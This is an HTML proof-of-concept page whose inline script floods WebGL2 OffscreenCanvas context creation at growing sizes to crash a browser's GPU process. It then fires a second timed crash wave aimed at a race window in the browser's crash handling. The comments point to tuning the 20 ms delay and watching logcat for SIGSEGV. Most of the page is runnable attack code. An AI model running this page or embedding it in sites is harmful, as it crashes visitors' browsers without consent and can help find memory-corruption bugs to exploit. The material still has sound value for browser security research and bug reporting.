<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>GPU Dual‑Crash Race PoC (Yielded)</title>
</head>
<body>
  <h3>GPU Double‑Crash Race (Yielded + Crash Detection)</h3>
  <p>
    <button id="start">Start Dual Crash</button>
    <button id="stop" disabled>Stop</button>
  </p>
  <pre id="log"></pre>

  <script>
    (function() {
      const log = (msg) => {
        const el = document.getElementById('log');
        el.textContent += msg + '\n';
        el.scrollTop = el.scrollHeight;
        console.log(msg);
      };

      // Helper to yield to the event loop for `ms` milliseconds
      const sleep = (ms) => new Promise(r => setTimeout(r, ms));

      // Check if the GPU process is alive by trying to create a tiny WebGL context
      function isGpuProcessAlive() {
        try {
          const testCanvas = document.createElement('canvas');
          testCanvas.width = 1;
          testCanvas.height = 1;
          const gl = testCanvas.getContext('webgl2');
          return gl !== null;
        } catch(e) {
          return false;
        }
      }

      async function crashWave(waveName) {
        log(`[${waveName}] Starting canvas bomb with yields...`);
        const attrs = [
          { powerPreference: 'high-performance' },
          { powerPreference: 'low-power' },
          { desynchronized: true },
          { preserveDrawingBuffer: true },
          { failIfMajorPerformanceCaveat: false },
          { xrCompatible: true }
        ];

        for (let w = 1; w <= 16384; w *= 2) {
          for (let h = 1; h <= 16384; h *= 2) {
            for (const attr of attrs) {
              try {
                const canvas = new OffscreenCanvas(w, h);
                const gl = canvas.getContext('webgl2', attr);
                if (!gl) continue;
                gl.clear(gl.COLOR_BUFFER_BIT);
                gl.flush();
                canvas.width = 0;
                canvas.height = 0;
              } catch(e) {}
            }
            // Yield every height step (every 6 attribute attempts) to let GPU breathe
            await sleep(0);
          }
          // Extra yield every width step
          await sleep(10);
        }
        log(`[${waveName}] Canvas bomb finished.`);
      }

      let running = false;

      document.getElementById('start').addEventListener('click', async () => {
        if (running) return;
        running = true;
        document.getElementById('stop').disabled = false;

        log('=== Wave 1: Crashing GPU process... ===');

        // Start the first crash wave
        crashWave('WAVE1');

        // Wait until the GPU process is dead (context lost)
        let crashed = false;
        for (let i = 0; i < 30; i++) {   // wait up to ~30 seconds
          await sleep(1000);
          if (!isGpuProcessAlive()) {
            log('[!] GPU process appears DEAD (context lost).');
            crashed = true;
            break;
          }
          log('  ...GPU still alive, waiting...');
        }

        if (!crashed) {
          log('[!] GPU did not crash from Wave 1. Aborting race.');
          running = false;
          document.getElementById('stop').disabled = true;
          return;
        }

        // Give the browser a moment to start the crash handler, then fire Wave 2
        log('=== Wave 2: Firing second crash while browser handles first... ===');
        await sleep(20);  // 20ms delay – tune this to hit the race window

        if (!running) return;

        crashWave('WAVE2');

        log('=== Both waves completed. Check logcat for double‑crash logs or SIGSEGV. ===');
        running = false;
        document.getElementById('stop').disabled = true;
      });

      document.getElementById('stop').addEventListener('click', () => {
        running = false;
        log('[!] Stopped by user.');
      });

      log('Ready. Press "Start Dual Crash" and watch logcat.');
    })();
  </script>
</body>
</html>
